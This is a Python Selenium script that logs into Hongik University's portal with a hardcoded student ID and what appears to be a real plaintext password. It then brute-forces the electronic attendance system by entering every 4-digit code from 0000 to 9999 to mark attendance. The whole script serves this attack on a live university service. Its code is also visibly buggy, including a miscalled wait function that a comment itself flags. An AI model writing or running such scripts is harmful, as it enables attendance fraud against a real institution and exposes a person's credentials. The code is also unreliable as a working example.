import selenium
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.alert import Alert
import time
import pyautogui

chrome_options = webdriver.ChromeOptions()
chrome_options.add_experimental_option("detach", True) #keep chrome opened
cService = webdriver.ChromeService(executable_path=r"chromedriver-win64/chromedriver.exe")
driver = webdriver.Chrome(service = cService, options = chrome_options)

driver.get("https://www.hongik.ac.kr/my/login.do?Refer=https://cn.hongik.ac.kr/")


#Login
try:
    #id
    element = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, 'USER_ID'))
    )
    user_id = driver.find_element(By.ID, 'USER_ID')
    user_id.send_keys("C421066")  # replace with your Hongik ID

    #pw
    element = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, 'PASSWD'))
    )
    user_pw = driver.find_element(By.ID, 'PASSWD')
    user_pw.send_keys("junsujunsu!045") # replace with your Hongik password

    #login button
    element = WebDriverWait(driver, 10).until(
    EC.presence_of_element_located((By.ID, 'btn-login'))
    )
    login_button = driver.find_element(By.ID, "btn-login")
    login_button.click()

    #popup click (password change alert)
    if WebDriverWait(driver, 10).until(EC.alert_is_present()):
        try: # Wait for the alert to be present
            alert = Alert(driver)
            alert.accept() # Accept the alert
        except:
            None

    #전자출결 click
    driver.switch_to.new_window()
    driver.get("https://at.hongik.ac.kr/")

    #전자출결이 활성화 되어있는지 확인
    registration_button = 0
    def checking_registration_button():
        if WebDriverWait(driver,120).until(EC.presence_of_element_located(By.CLASS_NAME,'success')): #presence_of_element_located() takes 1 positional argument but 2 were given
            try:
                global registration_button
                registration_button = 1
            except:
                def clicking_f5(): 
                    pyautogui.press('f5')
                clicking_f5()
                checking_registration_button()


    #starting brute force
    while registration_button == 0:
        checking_registration_button()
        time.sleep(1)
        if registration_button == 1:
            registration_button_real = driver.find_element(By.CLASS_NAME,'success')
            registration_button_real.click()
            registration_write = driver.find_element(By.CLASS_NAME,'form-control text-center')
            for i in range(10000):
                password = f'{i:04d}'
                registration_write.send_keys(password)
                if WebDriverWait(driver, 3).until(EC.alert_is_present()):
                    try: # Wait for the alert to be present
                        alert = Alert(driver)
                        alert.accept() # Accept the alert
                    except:
                        None
            registration_check = driver.find_element(By.ID,"btn_insert")
            registration_check.click()
            registration_button = 0
            break


except Exception as e:
    print(e)

